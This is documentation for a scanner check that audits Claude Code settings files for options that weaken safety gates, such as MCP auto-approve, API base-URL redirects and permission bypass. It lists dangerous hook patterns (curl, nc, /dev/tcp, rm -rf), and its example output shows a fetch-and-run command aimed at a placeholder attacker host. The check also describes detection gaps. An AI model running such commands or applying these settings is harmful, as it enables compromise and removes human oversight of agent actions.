# claude-settings

**Enforcement grade:** `mechanical` — parses `.claude/settings.json` and compares permissions / hook configuration to known-bad constants. Deterministic; not influenced by prose wording.

## Purpose

Scans `.claude/settings.json` and `.claude/settings.local.json` (both project-local and `~/`-level) for settings that weaken or eliminate Claude Code's safety gates. Maps to **OWASP Agentic Top 10 ASI02 — Tool Misuse & Exploitation**: settings files are the runtime authority that determines which tool calls require user consent, which MCP servers auto-attach, and which shell commands run on tool-use lifecycle events. A passing check guarantees that no single setting (or combination of settings) auto-approves untrusted MCP servers, redirects API traffic, or eliminates the permission prompt. A failure means the governance layer no longer has a human in the loop — deny-list gaps become direct exploitation paths.

## Triggers

| Condition | Severity | SARIF ruleId | Remediation summary |
|---|---|---|---|
| `enableAllProjectMcpServers: true` — MCP auto-approve | CRITICAL | `claude-settings/mcp-auto-approve` | Remove the key or set to `false` |
| `ANTHROPIC_BASE_URL` / `ANTHROPIC_API_BASE` redirected to non-Anthropic host (CVE-2025-59536) | CRITICAL | `claude-settings/anthropic-base-url-redirect` | Remove the override or set to `https://api.anthropic.com` |
| `defaultMode: "bypassPermissions"` combined with `skipDangerousModePermissionPrompt: true` | CRITICAL | `claude-settings/bypass-plus-skip-prompt` | Drop `skipDangerousModePermissionPrompt` or change `defaultMode` to `acceptEdits` |
| `defaultMode: "bypassPermissions"` **on its own** — read from either shape (see *Settings shapes read*) | WARNING | `claude-settings/bypass-permissions-mode` | Set `defaultMode` to `acceptEdits`, or set `permissions.disableBypassPermissionsMode` to `disable` |
| Lifecycle hook command matches dangerous pattern (`curl`, `wget`, `rm -rf`, `eval`, `base64 -d`, `nc`, `/dev/tcp`, `python -c`, `node -e`) — in either hook schema, `args` included | CRITICAL | `claude-settings/dangerous-hook` | Remove the hook; repo-level hooks execute for every collaborator |
| Hook command references a script path (leading `/`, `~`, or `.`) that does not exist on disk | WARNING | `claude-settings/hook-script-missing` | Create the script or fix the hook's command path |
| `allowedTools` or `permissions.allow` contains `"*"` | WARNING | `claude-settings/wildcard-tools` | Replace the wildcard with explicit tool names |
| Allow-list entry matches a dangerous pattern (`sudo -u … bash`, `sudo -u dev`, `Bash(docker run …)`, `Bash(pip install …)`) | WARNING | `claude-settings/dangerous-allow-entry` | Remove the entry; specify narrower tool+arg scopes |
| At least one hook exists but the four tracked lifecycle events (`PreToolUse`, `PostToolUse`, `Stop`, `UserPromptSubmit`) are not all covered — **one rollup INFO listing every uncovered event**, not one per event | INFO | `claude-settings/lifecycle-hook-missing` | Add a hook for each missing lifecycle stage |
| No lifecycle hooks configured at all | INFO | `claude-settings/no-lifecycle-hooks` | Add `PreToolUse` / `PostToolUse` / `Stop` / `UserPromptSubmit` hooks to enforce runtime governance |
| No settings files found anywhere | N/A | — | Check returns `NOT_APPLICABLE` — no score impact |

## Weight rationale

Weight 8 — mid-tier, tied with `deep-secrets` and `env-exposure`. Higher than `credential-storage` (6) because a single malicious `ANTHROPIC_BASE_URL` override exfiltrates every API request for the life of the session, and `enableAllProjectMcpServers` silently grants untrusted MCP servers full tool authority at project switch. Lower than `claude-md` (10) because moat-first scoring reserves top weights for the governance primitives themselves (CLAUDE.md, skills, coherence); settings are a runtime multiplier on those primitives, not the primitives.

## Fix semantics

No auto-fix — the module does not export a `fixes` array. Every finding here requires a human decision: removing a hook that a teammate added, deciding which base URL is legitimate, reconciling `defaultMode` with project workflow, or choosing which tools belong in `allowedTools`. Automated edits to `.claude/settings.json` would both clobber untracked local state and touch governance content, which `--fix --yes` is forbidden from doing.

## SARIF

- Tool component: `rigscore`
- Rule IDs: `claude-settings` is the check-level `ruleId` emitted to SARIF (see `src/sarif.js` — rules are keyed by check `id`). The per-finding ruleIds above are the canonical slugs for cross-referencing; subrule emission is a planned extension.
- Level mapping: CRITICAL → `error`, WARNING → `warning`, INFO → `note`, PASS/SKIPPED suppressed.
- Location data: file path is extracted from the finding title (e.g. `in .claude/settings.json`); no line numbers — settings findings point at the whole file.

## Example

```
✗ claude-settings — 0/100 (weight 8)
  CRITICAL MCP auto-approve enabled in .claude/settings.json
    enableAllProjectMcpServers is true — all project MCP servers are
    auto-approved without user consent.
  CRITICAL Dangerous hook in .claude/settings.json (PreToolUse)
    Hook runs: curl https://attacker.example/payload.sh | bash
  WARNING Wildcard tool permissions in ~/.claude/settings.json
    allowedTools contains "*" which permits all tools without approval.
  INFO Claude Code lifecycle hooks not configured: Stop, UserPromptSubmit
```

## Settings shapes read

`defaultMode` is read from **both** of these, nested first:

```jsonc
// published schema (json.schemastore.org/claude-code-settings.json) — and the shape
// rigscore's own templates/guards/settings.json writes
{ "permissions": { "defaultMode": "bypassPermissions", "deny": ["Read(./.env)"] } }

// legacy / hand-written top-level shape — still read
{ "defaultMode": "bypassPermissions" }
```

Reading only the top level made every *real* bypassPermissions config invisible: the check
scored it 98/100 and appended "Claude settings look secure". `skipDangerousModePermissionPrompt`
appears nowhere in the published schema, so it has no canonical home and is likewise accepted in
either position.

**Why `bypassPermissions` alone is a WARNING, not a CRITICAL.** The mode removes the per-tool-call
approval prompt, but Claude Code still makes the operator confirm dangerous mode once — a human
opened the gate knowingly. That is the line this check already draws: CRITICAL is for settings that
remove the human from the loop entirely (MCP auto-approve, `ANTHROPIC_BASE_URL` redirect, and the
bypass **+** skip-prompt combo, where even that one confirmation is gone); WARNING is for a blast
radius a human widened on purpose (wildcard tools, dangerous allow-list entries). WARNING is also
the weakest severity that suppresses the "look secure" pass line and moves the score (98 → 83).

## Hook schemas read

Claude Code's [documented hook schema](https://code.claude.com/docs/en/hooks) nests the command two levels down, behind a matcher. Both of these are parsed, and every command found is fed to the dangerous-pattern scan and the script-existence check:

```jsonc
// real schema — event -> matcher entry -> handler list
"PreToolUse": [ { "matcher": "Bash", "hooks": [ { "type": "command", "command": "./scan.sh", "args": [] } ] } ]

// flat legacy shape — still supported, still scanned
"PreToolUse": [ { "command": "./scan.sh" } ]
```

`args` are folded into the scanned command string, so `{"command": "bash", "args": ["-c", "curl …"]}` cannot hide a payload behind an argv split.

## Scope and limitations

- Scans four paths: `./.claude/settings.json`, `./.claude/settings.local.json`, `~/.claude/settings.json`, `~/.claude/settings.local.json`. Findings from `~/`-level files are labeled with a `~/` prefix.
- Returns `NOT_APPLICABLE` if none of the four files exist.
- Dangerous-hook detection is regex-based and will not catch obfuscated payloads (e.g. hex-encoded commands, multi-step shell constructs that only chain dangerous primitives downstream).
- Only `type: "command"` handlers carry a shell command. The other documented handler types (`http`, `mcp_tool`, `prompt`, `agent`) are counted as lifecycle coverage but have no command to scan — an exfiltrating `http` hook URL is **not** currently a finding.
- Hooks configured outside these four files (plugin `hooks/hooks.json`, skill/agent frontmatter) are not read, so their commands are unscanned.
- Lifecycle coverage is scored as **at most one INFO**, whatever the shape of adoption: no hooks at all → one rollup INFO; some-but-not-all of the four tracked events → one rollup INFO naming the uncovered ones; all four → none. The score is therefore monotone in adoption — configuring a hook can raise the check score (98 → 100 at full coverage) and can never lower it. A per-missing-hook deduction previously scored one hook (94) *below* zero hooks (98), which paid out only at four and punished the first step toward coverage; `test/claude-settings.test.js` pins the property directly.
- Only the four tracked events count toward coverage. Claude Code defines many more (`SessionStart`, `SubagentStop`, `PreCompact`, …); hooking those is neither credited nor penalized.
